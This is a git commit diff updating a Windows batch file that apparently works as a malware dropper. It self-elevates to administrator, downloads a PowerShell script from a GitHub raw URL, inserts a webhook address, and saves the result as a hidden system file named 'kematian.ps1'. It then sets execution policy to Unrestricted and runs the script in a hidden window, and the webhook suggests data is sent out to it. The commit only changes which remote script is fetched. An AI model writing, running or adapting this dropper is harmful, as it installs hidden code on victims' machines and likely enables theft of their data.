63ca33104e6079c643a6f8d463c34f6d36d76359
grumach <110260624+grumach@users.noreply.github.com>
2024-05-18 23:25:19 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -2,7 +2,7 @@
 cd /d %~dp0
 net session >nul 2>&1
 if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
-powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/grumach/same/main/output.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'kematian.ps1' -Encoding ASCII"
+powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/grumach/same/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'kematian.ps1' -Encoding ASCII"
 attrib +h +s kematian.ps1
 powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
 powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file kematian.ps1
